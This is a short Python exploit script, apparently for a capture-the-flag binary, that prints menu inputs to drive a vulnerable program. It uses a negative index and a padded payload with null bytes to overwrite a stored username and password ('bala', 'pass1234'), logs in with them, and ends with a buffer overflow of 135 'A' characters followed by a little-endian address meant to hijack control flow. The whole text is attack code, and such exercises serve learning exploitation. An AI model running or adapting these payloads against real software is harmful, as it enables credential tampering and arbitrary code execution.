# use python3
print("0")
print("user1")
print("user1")
print("user1")

print("0")
print("user 2")
print("user 2")
print("user 2")

print("0")
print("user 3")
print("user 3")
print("user 3")

print("7")
print("user 3")
print("user 3")

print("3")
print(-200)
payload = ""
payload += "A" * 132
payload += "bala"
payload += "\x00"
payload += "A" * 27
payload += "pass1234"
payload += "\x00"

print(payload)

print("7")
print("bala")
print("pass1234")

print("1")
print()
print('A' * 135 + '\x96\x12\x40\x00\x00\x00\x00\x00\x00\x00\x00')
